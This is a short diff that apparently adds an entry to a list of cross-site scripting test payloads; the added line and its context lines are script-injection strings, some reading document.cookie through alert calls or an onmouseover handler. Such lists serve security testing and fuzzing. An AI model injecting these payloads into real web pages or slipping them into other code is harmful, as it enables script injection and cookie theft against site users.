@@ -9,3 +9,5 @@
 '-alert(1)-'
 
 "><a onmouseover="alert(document.cookie)">xxs link</a>
+
+['-alert(document.cookie)-']
